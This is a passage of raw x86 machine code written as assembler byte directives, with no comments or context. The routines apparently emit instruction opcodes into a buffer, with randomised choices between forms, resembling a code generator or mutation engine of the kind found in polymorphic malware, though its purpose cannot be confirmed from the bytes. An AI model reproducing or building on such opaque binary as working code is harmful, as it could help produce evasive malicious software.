db 056h, 0ffh, 0ffh, 0ffh, 083h, 0c4h, 018h, 040h, 05fh, 05eh, 05dh, 0c3h, 055h, 08bh
db 0ech, 053h, 08bh, 05dh, 01ch, 08bh, 0c3h, 056h, 057h, 08bh, 07dh, 018h, 0d1h, 0e8h
db 050h, 057h, 0ffh, 075h, 014h, 06ah, 004h, 0ffh, 075h, 00ch, 06ah, 001h, 06ah, 000h
db 0e8h, 000h, 0feh, 0ffh, 0ffh, 08bh, 0f0h, 083h, 0c4h, 01ch, 085h, 0f6h, 074h, 022h
db 08bh, 0c3h, 02bh, 0c6h, 050h, 08dh, 004h, 03eh, 050h, 0ffh, 075h, 014h, 06ah, 004h
db 06ah, 004h, 06ah, 003h, 06ah, 001h, 0e8h, 0deh, 0fdh, 0ffh, 0ffh, 08bh, 0f8h, 083h
db 0c4h, 01ch, 085h, 0ffh, 075h, 004h, 033h, 0c0h, 0ebh, 027h, 02bh, 0dfh, 02bh, 0deh
db 074h, 01eh, 08dh, 004h, 037h, 053h, 003h, 045h, 018h, 050h, 0ffh, 075h, 014h, 0ffh
db 075h, 010h, 0ffh, 075h, 00ch, 0ffh, 075h, 008h, 0e8h, 0ddh, 0feh, 0ffh, 0ffh, 083h
db 0c4h, 018h, 003h, 0f8h, 08dh, 004h, 037h, 05fh, 05eh, 05bh, 05dh, 0c3h, 055h, 08bh
db 0ech, 056h, 057h, 08bh, 07dh, 01ch, 085h, 0ffh, 075h, 004h, 033h, 0c0h, 0ebh, 04fh
db 0e8h, 01ah, 023h, 000h, 000h, 08bh, 075h, 018h, 0a8h, 001h, 074h, 01ah, 057h, 056h
db 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 0ffh, 075h, 008h, 0e8h, 034h
db 000h, 000h, 000h, 083h, 0c4h, 018h, 085h, 0c0h, 075h, 029h, 08ah, 045h, 00ch, 08dh
db 04fh, 0ffh, 004h, 050h, 06ah, 001h, 088h, 006h, 058h, 085h, 0c9h, 074h, 018h, 046h
db 051h, 056h, 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 0ffh, 075h, 008h
db 0e8h, 075h, 0feh, 0ffh, 0ffh, 083h, 0c4h, 018h, 040h, 05fh, 05eh, 05dh, 0c3h, 055h
db 08bh, 0ech, 053h, 08bh, 05dh, 01ch, 08bh, 0c3h, 056h, 057h, 08bh, 07dh, 018h, 0d1h
db 0e8h, 050h, 057h, 0ffh, 075h, 014h, 06ah, 004h, 06ah, 004h, 06ah, 003h, 06ah, 002h
db 0e8h, 020h, 0fdh, 0ffh, 0ffh, 08bh, 0f0h, 083h, 0c4h, 01ch, 085h, 0f6h, 074h, 023h
db 08bh, 0c3h, 02bh, 0c6h, 050h, 08dh, 004h, 03eh, 050h, 0ffh, 075h, 014h, 0ffh, 075h
db 00ch, 06ah, 004h, 06ah, 002h, 06ah, 000h, 0e8h, 0fdh, 0fch, 0ffh, 0ffh, 08bh, 0f8h
db 083h, 0c4h, 01ch, 085h, 0ffh, 075h, 004h, 033h, 0c0h, 0ebh, 027h, 02bh, 0dfh, 02bh
db 0deh, 074h, 01eh, 08dh, 004h, 037h, 053h, 003h, 045h, 018h, 050h, 0ffh, 075h, 014h
db 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 0ffh, 075h, 008h, 0e8h, 0fch, 0fdh, 0ffh, 0ffh
db 083h, 0c4h, 018h, 003h, 0f8h, 08dh, 004h, 037h, 05fh, 05eh, 05bh, 05dh, 0c3h, 055h
db 08bh, 0ech, 051h, 053h, 056h, 057h, 033h, 0ffh, 089h, 07dh, 0fch, 0e8h, 03dh, 022h
db 000h, 000h, 08bh, 075h, 018h, 08bh, 05dh, 010h, 0a8h, 001h, 074h, 021h, 0ffh, 075h
db 01ch, 056h, 0ffh, 075h, 014h, 053h, 0ffh, 075h, 00ch, 0ffh, 075h, 008h, 0e8h, 0d8h
db 001h, 000h, 000h, 08bh, 0f8h, 083h, 0c4h, 018h, 085h, 0ffh, 074h, 005h, 0e9h, 0a6h
db 000h, 000h, 000h, 08bh, 045h, 008h, 085h, 0c0h, 00fh, 084h, 097h, 001h, 000h, 000h
db 00fh, 086h, 0aah, 001h, 000h, 000h, 06ah, 002h, 05ah, 03bh, 0c2h, 00fh, 086h, 0bfh
db 000h, 000h, 000h, 083h, 0f8h, 003h, 00fh, 084h, 09bh, 000h, 000h, 000h, 083h, 0f8h
db 004h, 00fh, 085h, 08dh, 001h, 000h, 000h, 08bh, 04dh, 00ch, 06ah, 007h, 058h, 0c6h
db 006h, 0c7h, 03bh, 0c8h, 076h, 01bh, 083h, 07dh, 01ch, 00ah, 00fh, 082h, 076h, 001h
db 000h, 000h, 0c6h, 046h, 001h, 005h, 089h, 04eh, 002h, 089h, 05eh, 006h, 06ah, 00ah
db 0e9h, 046h, 001h, 000h, 000h, 083h, 0f9h, 004h, 075h, 012h, 039h, 045h, 01ch, 00fh
db 082h, 057h, 001h, 000h, 000h, 088h, 04eh, 001h, 0c6h, 046h, 002h, 024h, 0ebh, 016h
db 083h, 0f9h, 005h, 075h, 039h, 039h, 045h, 01ch, 00fh, 082h, 040h, 001h, 000h, 000h
db 080h, 066h, 002h, 000h, 0c6h, 046h, 001h, 045h, 089h, 05eh, 003h, 08bh, 0f8h, 08bh
db 045h, 01ch, 02bh, 0c7h, 050h, 08dh, 004h, 037h, 050h, 0ffh, 075h, 014h, 053h, 0ffh
db 075h, 00ch, 0ffh, 075h, 008h, 0e8h, 012h, 0fdh, 0ffh, 0ffh, 083h, 0c4h, 018h, 003h
db 0c7h, 05fh, 05eh, 05bh, 0c9h, 0c3h, 083h, 07dh, 01ch, 006h, 00fh, 082h, 006h, 001h
db 000h, 000h, 088h, 04eh, 001h, 089h, 05eh, 002h, 0e9h, 0dah, 000h, 000h, 000h, 083h
db 07dh, 01ch, 005h, 00fh, 082h, 0f1h, 000h, 000h, 000h, 08ah, 045h, 00ch, 089h, 05eh
db 001h, 02ch, 048h, 06ah, 005h, 088h, 006h, 0e9h, 0c1h, 000h, 000h, 000h, 039h, 055h
db 01ch, 00fh, 082h, 0d7h, 000h, 000h, 000h, 083h, 0f8h, 001h, 0c6h, 006h, 089h, 075h
db 003h, 0c6h, 006h, 08bh, 03bh, 0c2h, 075h, 00ah, 08bh, 045h, 00ch, 08bh, 0cbh, 0c1h
db 0e1h, 003h, 0ebh, 00ah, 08bh, 045h, 00ch, 08bh, 0c8h, 08bh, 0c3h, 0c1h, 0e1h, 003h
db 083h, 0f8h, 007h, 076h, 004h, 06ah, 005h, 0ebh, 009h, 0c7h, 045h, 0fch, 001h, 000h
db 000h, 000h, 06ah, 004h, 058h, 00ah, 0c1h, 083h, 07dh, 0fch, 000h, 088h, 046h, 001h
db 074h, 062h, 0e8h, 0e8h, 020h, 000h, 000h, 0a8h, 001h, 075h, 037h, 08bh, 04dh, 00ch
db 083h, 0f9h, 005h, 074h, 02fh, 083h, 0f9h, 004h, 074h, 02ah, 083h, 0fbh, 005h, 074h
db 025h, 083h, 0fbh, 004h, 074h, 020h, 083h, 07dh, 008h, 001h, 075h, 004h, 08bh, 0c1h
db 0ebh, 008h, 083h, 07dh, 008h, 002h, 08bh, 0c3h, 074h, 002h, 08bh, 0cbh, 0c0h, 0e0h
db 003h, 00ah, 0c1h, 06ah, 002h, 088h, 046h, 001h, 0ebh, 037h, 083h, 07dh, 01ch, 007h
db 072h, 050h, 080h, 04eh, 001h, 080h, 083h, 07dh, 008h, 002h, 08bh, 045h, 00ch, 074h
db 002h, 08bh, 0c3h, 00ch, 020h, 083h, 066h, 003h, 000h, 088h, 046h, 002h, 06ah, 007h
db 0ebh, 015h, 083h, 07dh, 01ch, 006h, 072h, 02eh, 039h, 055h, 008h, 08bh, 045h, 00ch
db 074h, 002h, 08bh, 0c3h, 089h, 046h, 002h, 06ah, 006h, 05fh, 0e9h, 0e6h, 0feh, 0ffh
db 0ffh, 083h, 07dh, 01ch, 002h, 072h, 013h, 08ah, 045h, 00ch, 06ah, 002h, 00ch, 0f8h
db 0c6h, 006h, 08bh, 0c0h, 0e0h, 003h, 00ah, 0c3h, 05fh, 088h, 046h, 001h, 085h, 0ffh
db 00fh, 085h, 0c5h, 0feh, 0ffh, 0ffh, 033h, 0c0h, 0e9h, 0dch, 0feh, 0ffh, 0ffh, 055h
db 08bh, 0ech, 0e8h, 040h, 020h, 000h, 000h, 0a8h, 001h, 074h, 01eh, 0ffh, 075h, 01ch
db 0ffh, 075h, 018h, 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 0ffh, 075h
db 008h, 0e8h, 00bh, 000h, 000h, 000h, 083h, 0c4h, 018h, 085h, 0c0h, 075h, 002h, 033h
db 0c0h, 05dh, 0c3h, 033h, 0c0h, 0c3h, 055h, 08bh, 0ech, 051h, 083h, 065h, 0fch, 000h
db 053h, 056h, 057h, 0e8h, 007h, 020h, 000h, 000h, 08bh, 045h, 008h, 085h, 0c0h, 00fh
db 084h, 0cah, 001h, 000h, 000h, 00fh, 086h, 0e7h, 001h, 000h, 000h, 06ah, 002h, 05ah
db 03bh, 0c2h, 00fh, 086h, 0e7h, 000h, 000h, 000h, 083h, 0f8h, 004h, 00fh, 087h, 0d3h
db 001h, 000h, 000h, 08bh, 075h, 018h, 083h, 0f8h, 003h, 0c6h, 006h, 081h, 075h, 06ah
db 083h, 07dh, 00ch, 000h, 075h, 047h, 0e8h, 0cch, 01fh, 000h, 000h, 0a8h, 001h, 074h
db 006h, 083h, 07dh, 01ch, 006h, 073h, 042h, 06ah, 005h, 05fh, 039h, 07dh, 01ch, 00fh
db 082h, 0a7h, 001h, 000h, 000h, 08bh, 05dh, 010h, 0c6h, 006h, 005h, 089h, 05eh, 001h
db 08bh, 045h, 01ch, 02bh, 0c7h, 050h, 08dh, 004h, 037h, 050h, 0ffh, 075h, 014h, 053h
db 0ffh, 075h, 00ch, 0ffh, 075h, 008h, 0e8h, 035h, 0fbh, 0ffh, 0ffh, 083h, 0c4h, 018h
db 003h, 0c7h, 05fh, 05eh, 05bh, 0c9h, 0c3h, 083h, 07dh, 01ch, 006h, 00fh, 082h, 071h
db 001h, 000h, 000h, 08ah, 045h, 00ch, 02ch, 040h, 08bh, 05dh, 010h, 088h, 046h, 001h
db 089h, 05eh, 002h, 0e9h, 033h, 001h, 000h, 000h, 08bh, 045h, 00ch, 06ah, 007h, 05fh
db 03bh, 0c7h, 076h, 01bh, 06ah, 00ah, 05fh, 039h, 07dh, 01ch, 00fh, 082h, 048h, 001h
db 000h, 000h, 08bh, 05dh, 010h, 0c6h, 046h, 001h, 005h, 089h, 046h, 002h, 089h, 05eh
db 006h, 0ebh, 09bh, 083h, 0f8h, 004h, 075h, 012h, 039h, 07dh, 01ch, 00fh, 082h, 02bh
db 001h, 000h, 000h, 088h, 046h, 001h, 0c6h, 046h, 002h, 024h, 0ebh, 016h, 083h, 0f8h
db 005h, 075h, 01ch, 039h, 07dh, 01ch, 00fh, 082h, 014h, 001h, 000h, 000h, 080h, 066h
db 002h, 000h, 0c6h, 046h, 001h, 045h, 08bh, 05dh, 010h, 089h, 05eh, 003h, 0e9h, 063h
db 0ffh, 0ffh, 0ffh, 083h, 07dh, 01ch, 006h, 00fh, 082h, 0f7h, 000h, 000h, 000h, 0ebh
db 089h, 039h, 055h, 01ch, 00fh, 082h, 0ech, 000h, 000h, 000h, 08bh, 075h, 018h, 083h
db 0f8h, 001h, 0c6h, 006h, 001h, 075h, 003h, 0c6h, 006h, 003h, 03bh, 0c2h, 075h, 00dh
db 08bh, 05dh, 010h, 08bh, 045h, 00ch, 08bh, 0cbh, 0c1h, 0e1h, 003h, 0ebh, 00dh, 08bh
db 045h, 00ch, 08bh, 05dh, 010h, 08bh, 0c8h, 08bh, 0c3h, 0c1h, 0e1h, 003h, 06ah, 007h
db 05fh, 03bh, 0c7h, 076h, 004h, 06ah, 005h, 0ebh, 009h, 0c7h, 045h, 0fch, 001h, 000h
db 000h, 000h, 06ah, 004h, 058h, 00ah, 0c1h, 083h, 07dh, 0fch, 000h, 088h, 046h, 001h
db 074h, 062h, 0e8h, 0aah, 01eh, 000h, 000h, 0a8h, 001h, 075h, 037h, 08bh, 04dh, 00ch
db 083h, 0f9h, 005h, 074h, 02fh, 083h, 0f9h, 004h, 074h, 02ah, 083h, 0fbh, 005h, 074h
db 025h, 083h, 0fbh, 004h, 074h, 020h, 083h, 07dh, 008h, 001h, 075h, 004h, 08bh, 0c1h
db 0ebh, 008h, 083h, 07dh, 008h, 002h, 08bh, 0c3h, 074h, 002h, 08bh, 0cbh, 0c0h, 0e0h
db 003h, 00ah, 0c1h, 06ah, 002h, 088h, 046h, 001h, 0ebh, 037h, 039h, 07dh, 01ch, 072h
db 05bh, 080h, 04eh, 001h, 080h, 083h, 07dh, 008h, 002h, 08bh, 045h, 00ch, 074h, 002h
db 08bh, 0c3h, 00ch, 020h, 083h, 066h, 003h, 000h, 088h, 046h, 002h, 0e9h, 0a0h, 0feh
db 0ffh, 0ffh, 083h, 07dh, 01ch, 006h, 072h, 038h, 039h, 055h, 008h, 08bh, 045h, 00ch
db 074h, 002h, 08bh, 0c3h, 089h, 046h, 002h, 06ah, 006h, 05fh, 0e9h, 085h, 0feh, 0ffh
db 0ffh, 06ah, 002h, 05fh, 039h, 07dh, 01ch, 072h, 01bh, 08ah, 045h, 00ch, 08bh, 05dh
db 010h, 08bh, 075h, 018h, 00ch, 0f8h, 0c0h, 0e0h, 003h, 00ah, 0c3h, 0c6h, 006h, 003h
db 088h, 046h, 001h, 0e9h, 062h, 0feh, 0ffh, 0ffh, 033h, 0c0h, 0e9h, 079h, 0feh, 0ffh
db 0ffh, 055h, 08bh, 0ech, 051h, 053h, 056h, 057h, 033h, 0ffh, 089h, 07dh, 0fch, 0e8h
db 0f7h, 01dh, 000h, 000h, 08bh, 075h, 018h, 08bh, 05dh, 010h, 0a8h, 001h, 074h, 021h
db 0ffh, 075h, 01ch, 056h, 0ffh, 075h, 014h, 053h, 0ffh, 075h, 00ch, 0ffh, 075h, 008h
db 0e8h, 0c0h, 0fdh, 0ffh, 0ffh, 08bh, 0f8h, 083h, 0c4h, 018h, 085h, 0ffh, 074h, 005h
db 0e9h, 0ech, 000h, 000h, 000h, 08bh, 045h, 008h, 085h, 0c0h, 00fh, 084h, 0c1h, 001h
db 000h, 000h, 00fh, 086h, 0d4h, 001h, 000h, 000h, 06ah, 002h, 05ah, 03bh, 0c2h, 00fh
db 086h, 0e9h, 000h, 000h, 000h, 083h, 0f8h, 004h, 00fh, 087h, 0c0h, 001h, 000h, 000h
db 083h, 0f8h, 003h, 0c6h, 006h, 081h, 075h, 046h, 083h, 07dh, 00ch, 000h, 075h, 026h
db 0e8h, 094h, 01dh, 000h, 000h, 0a8h, 001h, 074h, 006h, 083h, 07dh, 01ch, 006h, 073h
db 021h, 083h, 07dh, 01ch, 005h, 00fh, 082h, 099h, 001h, 000h, 000h, 0c6h, 006h, 02dh
db 089h, 05eh, 001h, 06ah, 005h, 0e9h, 06dh, 001h, 000h, 000h, 083h, 07dh, 01ch, 006h
db 00fh, 082h, 082h, 001h, 000h, 000h, 08ah, 045h, 00ch, 02ch, 018h, 088h, 046h, 001h
db 089h, 05eh, 002h, 0e9h, 051h, 001h, 000h, 000h, 06ah, 007h, 058h, 039h, 045h, 00ch
db 076h, 01eh, 083h, 07dh, 01ch, 00ah, 00fh, 082h, 060h, 001h, 000h, 000h, 08bh, 045h
db 00ch, 0c6h, 046h, 001h, 02dh, 089h, 046h, 002h, 089h, 05eh, 006h, 06ah, 00ah, 0e9h
db 02dh, 001h, 000h, 000h, 083h, 07dh, 00ch, 004h, 075h, 013h, 039h, 045h, 01ch, 00fh
db 082h, 03dh, 001h, 000h, 000h, 0c6h, 046h, 001h, 02ch, 0c6h, 046h, 002h, 024h, 0ebh
db 017h, 083h, 07dh, 00ch, 005h, 075h, 039h, 039h, 045h, 01ch, 00fh, 082h, 024h, 001h
db 000h, 000h, 080h, 066h, 002h, 000h, 0c6h, 046h, 001h, 06dh, 089h, 05eh, 003h, 08bh
db 0f8h, 08bh, 045h, 01ch, 02bh, 0c7h, 050h, 08dh, 004h, 037h, 050h, 0ffh, 075h, 014h
db 053h, 0ffh, 075h, 00ch, 0ffh, 075h, 008h, 0e8h, 086h, 0f8h, 0ffh, 0ffh, 083h, 0c4h
db 018h, 003h, 0c7h, 05fh, 05eh, 05bh, 0c9h, 0c3h, 083h, 07dh, 01ch, 006h, 00fh, 082h
db 0eah, 000h, 000h, 000h, 08ah, 045h, 00ch, 004h, 028h, 0e9h, 063h, 0ffh, 0ffh, 0ffh
db 039h, 055h, 01ch, 00fh, 082h, 0d7h, 000h, 000h, 000h, 083h, 0f8h, 001h, 0c6h, 006h
db 029h, 075h, 003h, 0c6h, 006h, 02bh, 03bh, 0c2h, 075h, 00ah, 08bh, 045h, 00ch, 08bh
db 0cbh, 0c1h, 0e1h, 003h, 0ebh, 00ah, 08bh, 045h, 00ch, 08bh, 0c8h, 08bh, 0c3h, 0c1h
db 0e1h, 003h, 083h, 0f8h, 007h, 076h, 004h, 06ah, 005h, 0ebh, 009h, 0c7h, 045h, 0fch
db 001h, 000h, 000h, 000h, 06ah, 004h, 058h, 00ah, 0c1h, 083h, 07dh, 0fch, 000h, 088h
db 046h, 001h, 074h, 062h, 0e8h, 078h, 01ch, 000h, 000h, 0a8h, 001h, 075h, 037h, 08bh
db 04dh, 00ch, 083h, 0f9h, 005h, 074h, 02fh, 083h, 0f9h, 004h, 074h, 02ah, 083h, 0fbh
db 005h, 074h, 025h, 083h, 0fbh, 004h, 074h, 020h, 083h, 07dh, 008h, 001h, 075h, 004h
db 08bh, 0c1h, 0ebh, 008h, 083h, 07dh, 008h, 002h, 08bh, 0c3h, 074h, 002h, 08bh, 0cbh
db 0c0h, 0e0h, 003h, 00ah, 0c1h, 06ah, 002h, 088h, 046h, 001h, 0ebh, 037h, 083h, 07dh
db 01ch, 007h, 072h, 050h, 080h, 04eh, 001h, 080h, 083h, 07dh, 008h, 002h, 08bh, 045h
db 00ch, 074h, 002h, 08bh, 0c3h, 00ch, 020h, 083h, 066h, 003h, 000h, 088h, 046h, 002h
db 06ah, 007h, 0ebh, 015h, 083h, 07dh, 01ch, 006h, 072h, 02eh, 039h, 055h, 008h, 08bh
db 045h, 00ch, 074h, 002h, 08bh, 0c3h, 089h, 046h, 002h, 06ah, 006h, 05fh, 0e9h, 002h
db 0ffh, 0ffh, 0ffh, 083h, 07dh, 01ch, 002h, 072h, 013h, 08ah, 045h, 00ch, 06ah, 002h
db 00ch, 0f8h, 0c6h, 006h, 02bh, 0c0h, 0e0h, 003h, 00ah, 0c3h, 05fh, 088h, 046h, 001h
db 085h, 0ffh, 00fh, 085h, 0e1h, 0feh, 0ffh, 0ffh, 033h, 0c0h, 0e9h, 0f8h, 0feh, 0ffh
db 0ffh, 055h, 08bh, 0ech, 08bh, 045h, 008h, 033h, 0d2h, 053h, 056h, 03bh, 0c2h, 057h
db 00fh, 084h, 0c9h, 001h, 000h, 000h, 00fh, 086h, 0e6h, 001h, 000h, 000h, 083h, 0f8h
db 002h, 00fh, 086h, 0e9h, 000h, 000h, 000h, 083h, 0f8h, 004h, 00fh, 087h, 0d4h, 001h
db 000h, 000h, 08bh, 075h, 018h, 083h, 0f8h, 003h, 0c6h, 006h, 081h, 075h, 069h, 039h
db 055h, 00ch, 075h, 047h, 0e8h, 098h, 01bh, 000h, 000h, 0a8h, 001h, 074h, 006h, 083h
db 07dh, 01ch, 006h, 073h, 042h, 06ah, 005h, 05fh, 039h, 07dh, 01ch, 00fh, 082h, 0a9h
db 001h, 000h, 000h, 08bh, 05dh, 010h, 0c6h, 006h, 035h, 089h, 05eh, 001h, 08bh, 045h
db 01ch, 02bh, 0c7h, 050h, 08dh, 004h, 037h, 050h, 0ffh, 075h, 014h, 053h, 0ffh, 075h
db 00ch, 0ffh, 075h, 008h, 0e8h, 001h, 0f7h, 0ffh, 0ffh, 083h, 0c4h, 018h, 003h, 0c7h
db 05fh, 05eh, 05bh, 05dh, 0c3h, 083h, 07dh, 01ch, 006h, 00fh, 082h, 073h, 001h, 000h
db 000h, 08ah, 045h, 00ch, 02ch, 010h, 08bh, 05dh, 010h, 088h, 046h, 001h, 089h, 05eh
db 002h, 0e9h, 035h, 001h, 000h, 000h, 08bh, 045h, 00ch, 06ah, 007h, 05fh, 03bh, 0c7h
db 076h, 01bh, 06ah, 00ah, 05fh, 039h, 07dh, 01ch, 00fh, 082h, 04ah, 001h, 000h, 000h
db 08bh, 05dh, 010h, 0c6h, 046h, 001h, 035h, 089h, 046h, 002h, 089h, 05eh, 006h, 0ebh
db 09bh, 083h, 0f8h, 004h, 075h, 013h, 039h, 07dh, 01ch, 00fh, 082h, 02dh, 001h, 000h
db 000h, 0c6h, 046h, 001h, 034h, 0c6h, 046h, 002h, 024h, 0ebh, 016h, 083h, 0f8h, 005h
db 075h, 01ch, 039h, 07dh, 01ch, 00fh, 082h, 015h, 001h, 000h, 000h, 080h, 066h, 002h
db 000h, 0c6h, 046h, 001h, 075h, 08bh, 05dh, 010h, 089h, 05eh, 003h, 0e9h, 062h, 0ffh
db 0ffh, 0ffh, 083h, 07dh, 01ch, 006h, 00fh, 082h, 0f8h, 000h, 000h, 000h, 004h, 030h
db 0ebh, 086h, 083h, 07dh, 01ch, 002h, 00fh, 082h, 0eah, 000h, 000h, 000h, 08bh, 075h
db 018h, 083h, 0f8h, 001h, 0c6h, 006h, 031h, 075h, 003h, 0c6h, 006h, 033h, 083h, 0f8h
db 002h, 075h, 00dh, 08bh, 05dh, 010h, 08bh, 045h, 00ch, 08bh, 0cbh, 0c1h, 0e1h, 003h
db 0ebh, 00dh, 08bh, 045h, 00ch, 08bh, 05dh, 010h, 08bh, 0c8h, 08bh, 0c3h, 0c1h, 0e1h
db 003h, 06ah, 005h, 083h, 0f8h, 007h, 05fh, 076h, 004h, 08bh, 0c7h, 0ebh, 006h, 06ah
db 001h, 05ah, 06ah, 004h, 058h, 00ah, 0c1h, 085h, 0d2h, 088h, 046h, 001h, 074h, 063h
db 0e8h, 076h, 01ah, 000h, 000h, 0a8h, 001h, 075h, 035h, 08bh, 04dh, 00ch, 03bh, 0cfh
db 074h, 02eh, 083h, 0f9h, 004h, 074h, 029h, 03bh, 0dfh, 074h, 025h, 083h, 0fbh, 004h
db 074h, 020h, 083h, 07dh, 008h, 001h, 075h, 004h, 08bh, 0c1h, 0ebh, 008h, 083h, 07dh
db 008h, 002h, 08bh, 0c3h, 074h, 002h, 08bh, 0cbh, 0c0h, 0e0h, 003h, 00ah, 0c1h, 06ah
db 002h, 088h, 046h, 001h, 0ebh, 03bh, 06ah, 007h, 05fh, 039h, 07dh, 01ch, 072h, 05ch
db 080h, 04eh, 001h, 080h, 083h, 07dh, 008h, 002h, 08bh, 045h, 00ch, 074h, 002h, 08bh
db 0c3h, 00ch, 020h, 083h, 066h, 003h, 000h, 088h, 046h, 002h, 0e9h, 09fh, 0feh, 0ffh
db 0ffh, 083h, 07dh, 01ch, 006h, 072h, 039h, 083h, 07dh, 008h, 002h, 08bh, 045h, 00ch
db 074h, 002h, 08bh, 0c3h, 089h, 046h, 002h, 06ah, 006h, 05fh, 0e9h, 083h, 0feh, 0ffh
db 0ffh, 06ah, 002h, 05fh, 039h, 07dh, 01ch, 072h, 01bh, 08ah, 045h, 00ch, 08bh, 05dh
db 010h, 08bh, 075h, 018h, 00ch, 0f8h, 0c0h, 0e0h, 003h, 00ah, 0c3h, 0c6h, 006h, 033h
db 088h, 046h, 001h, 0e9h, 060h, 0feh, 0ffh, 0ffh, 033h, 0c0h, 0e9h, 077h, 0feh, 0ffh
db 0ffh, 055h, 08bh, 0ech, 08bh, 045h, 008h, 033h, 0d2h, 053h, 056h, 03bh, 0c2h, 057h
db 00fh, 084h, 0c9h, 001h, 000h, 000h, 00fh, 086h, 0e6h, 001h, 000h, 000h, 083h, 0f8h
db 002h, 00fh, 086h, 0e9h, 000h, 000h, 000h, 083h, 0f8h, 004h, 00fh, 087h, 0d4h, 001h
db 000h, 000h, 08bh, 075h, 018h, 083h, 0f8h, 003h, 0c6h, 006h, 081h, 075h, 069h, 039h
db 055h, 00ch, 075h, 047h, 0e8h, 092h, 019h, 000h, 000h, 0a8h, 001h, 074h, 006h, 083h
db 07dh, 01ch, 006h, 073h, 042h, 06ah, 005h, 05fh, 039h, 07dh, 01ch, 00fh, 082h, 0a9h
db 001h, 000h, 000h, 08bh, 05dh, 010h, 0c6h, 006h, 03dh, 089h, 05eh, 001h, 08bh, 045h
db 01ch, 02bh, 0c7h, 050h, 08dh, 004h, 037h, 050h, 0ffh, 075h, 014h, 053h, 0ffh, 075h
db 00ch, 0ffh, 075h, 008h, 0e8h, 0fbh, 0f4h, 0ffh, 0ffh, 083h, 0c4h, 018h, 003h, 0c7h
db 05fh, 05eh, 05bh, 05dh, 0c3h, 083h, 07dh, 01ch, 006h, 00fh, 082h, 073h, 001h, 000h
db 000h, 08ah, 045h, 00ch, 02ch, 008h, 08bh, 05dh, 010h, 088h, 046h, 001h, 089h, 05eh
db 002h, 0e9h, 035h, 001h, 000h, 000h, 08bh, 045h, 00ch, 06ah, 007h, 05fh, 03bh, 0c7h
db 076h, 01bh, 06ah, 00ah, 05fh, 039h, 07dh, 01ch, 00fh, 082h, 04ah, 001h, 000h, 000h
db 08bh, 05dh, 010h, 0c6h, 046h, 001h, 03dh, 089h, 046h, 002h, 089h, 05eh, 006h, 0ebh
db 09bh, 083h, 0f8h, 004h, 075h, 013h, 039h, 07dh, 01ch, 00fh, 082h, 02dh, 001h, 000h
db 000h, 0c6h, 046h, 001h, 03ch, 0c6h, 046h, 002h, 024h, 0ebh, 016h, 083h, 0f8h, 005h
db 075h, 01ch, 039h, 07dh, 01ch, 00fh, 082h, 015h, 001h, 000h, 000h, 080h, 066h, 002h
db 000h, 0c6h, 046h, 001h, 07dh, 08bh, 05dh, 010h, 089h, 05eh, 003h, 0e9h, 062h, 0ffh
db 0ffh, 0ffh, 083h, 07dh, 01ch, 006h, 00fh, 082h, 0f8h, 000h, 000h, 000h, 004h, 038h
db 0ebh, 086h, 083h, 07dh, 01ch, 002h, 00fh, 082h, 0eah, 000h, 000h, 000h, 08bh, 075h
db 018h, 083h, 0f8h, 001h, 0c6h, 006h, 039h, 075h, 003h, 0c6h, 006h, 03bh, 083h, 0f8h
db 002h, 075h, 00dh, 08bh, 05dh, 010h, 08bh, 045h, 00ch, 08bh, 0cbh, 0c1h, 0e1h, 003h
db 0ebh, 00dh, 08bh, 045h, 00ch, 08bh, 05dh, 010h, 08bh, 0c8h, 08bh, 0c3h, 0c1h, 0e1h
db 003h, 06ah, 005h, 083h, 0f8h, 007h, 05fh, 076h, 004h, 08bh, 0c7h, 0ebh, 006h, 06ah
db 001h, 05ah, 06ah, 004h, 058h, 00ah, 0c1h, 085h, 0d2h, 088h, 046h, 001h, 074h, 063h
db 0e8h, 070h, 018h, 000h, 000h, 0a8h, 001h, 075h, 035h, 08bh, 04dh, 00ch, 03bh, 0cfh
db 074h, 02eh, 083h, 0f9h, 004h, 074h, 029h, 03bh, 0dfh, 074h, 025h, 083h, 0fbh, 004h
db 074h, 020h, 083h, 07dh, 008h, 001h, 075h, 004h, 08bh, 0c1h, 0ebh, 008h, 083h, 07dh
db 008h, 002h, 08bh, 0c3h, 074h, 002h, 08bh, 0cbh, 0c0h, 0e0h, 003h, 00ah, 0c1h, 06ah
db 002h, 088h, 046h, 001h, 0ebh, 03bh, 06ah, 007h, 05fh, 039h, 07dh, 01ch, 072h, 05ch
db 080h, 04eh, 001h, 080h, 083h, 07dh, 008h, 002h, 08bh, 045h, 00ch, 074h, 002h, 08bh
db 0c3h, 00ch, 020h, 083h, 066h, 003h, 000h, 088h, 046h, 002h, 0e9h, 09fh, 0feh, 0ffh
db 0ffh, 083h, 07dh, 01ch, 006h, 072h, 039h, 083h, 07dh, 008h, 002h, 08bh, 045h, 00ch
db 074h, 002h, 08bh, 0c3h, 089h, 046h, 002h, 06ah, 006h, 05fh, 0e9h, 083h, 0feh, 0ffh
db 0ffh, 06ah, 002h, 05fh, 039h, 07dh, 01ch, 072h, 01bh, 08ah, 045h, 00ch, 08bh, 05dh
db 010h, 08bh, 075h, 018h, 00ch, 0f8h, 0c0h, 0e0h, 003h, 00ah, 0c3h, 0c6h, 006h, 03bh
db 088h, 046h, 001h, 0e9h, 060h, 0feh, 0ffh, 0ffh, 033h, 0c0h, 0e9h, 077h, 0feh, 0ffh
db 0ffh, 055h, 08bh, 0ech, 08bh, 04dh, 01ch, 053h, 083h, 0f9h, 003h, 072h, 021h, 08bh
db 045h, 018h, 08bh, 055h, 00ch, 083h, 0fah, 003h, 0c6h, 000h, 0c1h, 076h, 067h, 06ah
db 004h, 05bh, 03bh, 0d3h, 074h, 040h, 083h, 0fah, 005h, 074h, 00ch, 076h, 005h, 083h
db 0fah, 007h, 076h, 054h, 033h, 0c0h, 05bh, 05dh, 0c3h, 03bh, 0cbh, 072h, 0f7h, 08bh
db 055h, 010h, 080h, 060h, 002h, 000h, 0c6h, 040h, 001h, 045h, 088h, 050h, 003h, 083h
db 0c1h, 0fch, 083h, 0c0h, 004h, 051h, 050h, 0ffh, 075h, 014h, 052h, 06ah, 005h, 0ffh
db 075h, 008h, 0e8h, 013h, 0f3h, 0ffh, 0ffh, 083h, 0c4h, 018h, 003h, 0c3h, 0ebh, 0ceh
db 03bh, 0cbh, 072h, 0c8h, 08bh, 055h, 010h, 088h, 058h, 001h, 0c6h, 040h, 002h, 024h
